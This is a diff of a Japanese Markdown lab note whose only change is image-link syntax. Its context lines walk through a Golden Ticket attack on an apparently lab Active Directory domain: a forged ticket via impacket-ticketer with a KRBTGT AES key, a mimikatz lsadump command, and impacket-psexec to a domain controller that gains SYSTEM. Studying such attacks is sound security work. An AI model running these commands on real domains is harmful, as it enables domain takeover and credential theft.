@@ -31,21 +31,21 @@ impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad
 ```
 
 - -aesKey: KRBTGT アカウントの AES キー（事前にダンプしたもの）
-![](assets/images/Pasted%20image%2020250906005737.png)
+![[Pasted image 20250906005737.png]]
 
 - -domain-sid: 現在のドメイン SID 
 ```zsh
 lsadump::lsa /patch
 ```
 
-![](../../../../assets/images/Pasted%20image%2020260502094655.png)
-![](../../../../assets/images/Pasted%20image%2020260502094649.png)
+![[Pasted image 20260502094655.png]]
+![[Pasted image 20260502094649.png]]
 
 - -extra-sid: 横展開先、親または子ドメインに対してアクセスする場合に必要（信頼関係など）
-- ![](../../../../assets/images/Pasted%20image%2020260502094641.png)
+- ![[Pasted image 20260502094641.png]]
 - -user-id 500: Administrator 固有の RID（500）を指定
 → 実行すると administrator.ccache が生成されます。
-![](../../../../assets/images/Pasted%20image%2020260502094636.png)
+![[Pasted image 20260502094636.png]]
 ## 環境変数で Kerberos チケットをセット
 ```zsh
 export KRB5CCNAME=$PWD/administrator.ccache
@@ -58,7 +58,7 @@ impacket-psexec 'sub.poseidon.yzx/administrator@dc01.poseidon.yzx' -k -no-pass
 ```
 - -k : Kerberos 認証を使用
 - -no-pass: パスワード不要（チケットを利用するため）
-![](../../../../assets/images/Pasted%20image%2020260502094628.png)
+![[Pasted image 20260502094628.png]]
 → whoami 実行結果が nt authority\system になり、SYSTEM 権限を取得できます。
 
 ✅ つまりこの一連の流れは Golden Ticket → Kerberos 認証で横展開 → SYSTEM権限取得 のデモですね。
